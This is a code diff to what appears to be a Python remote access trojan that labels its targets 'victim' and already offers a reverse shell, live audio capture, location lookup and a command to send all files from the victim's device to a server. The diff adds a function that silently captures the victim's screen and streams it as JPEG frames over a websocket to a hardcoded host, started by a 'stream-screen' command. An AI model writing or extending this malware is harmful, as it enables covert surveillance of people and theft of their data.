@@ -16,9 +16,12 @@ from scipy.io.wavfile import write
 import sounddevice as sd
 import sys
 import webbrowser
+import numpy
+import mss
 SERVER_URL = "192.168.88.106:2020"
 WEBSOCKET_URL="ws://192.168.88.106:8765"
 WEBSOCKET_AUDIO="ws://192.168.88.106:8766"
+WEBSOCKET_SCREEN = "ws://192.168.88.106:6666"
 PORT=12345
 IP_ADDRESS="192.168.88.106"
 banner = r"""
@@ -57,6 +60,26 @@ banner = r"""
  -open-browser link: Open browser to specifc link.
  -send-all: send all files for current directory from victim's device to the server.
 """
+async def watch_victim_screen():
+    async with websockets.connect(WEBSOCKET_SCREEN) as ws:
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            while True:
+                img = sct.grab(monitor)
+                frame = numpy.array(img)
+                frame = cv2.cvtColor(frame,cv2.COLOR_BGRA2BGR)
+                _,buffer = cv2.imencode(
+                    ".jpg",
+                    frame,
+                    [int(cv2.IMWRITE_JPEG_QUALITY),60]
+                )
+                await ws.send(buffer.tobytes())
+                await asyncio.sleep(0.03)
+def start_watching_victim_screen():
+    try:
+        asyncio.run(watch_victim_screen())
+    except Exception:
+        pass
 def open_browser(link:str):
     if link.startswith('http://') or link.startswith('https://'):
         webbrowser.open(link)
@@ -222,7 +245,6 @@ def get_location():
             return True
         except:
             return False
-
     return False
 def record_and_send_audio(duration_seconds):
     sample_rate = 44100
@@ -276,6 +298,8 @@ def reverse_shell_payload():
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
+           if cmd.lower() == "stream-screen":
+               threading.Thread(target=start_watching_victim_screen,daemon=True).start()
            if cmd.lower() == "stream-sound":
                thread_audio = listening_victim_realtime()
                continue
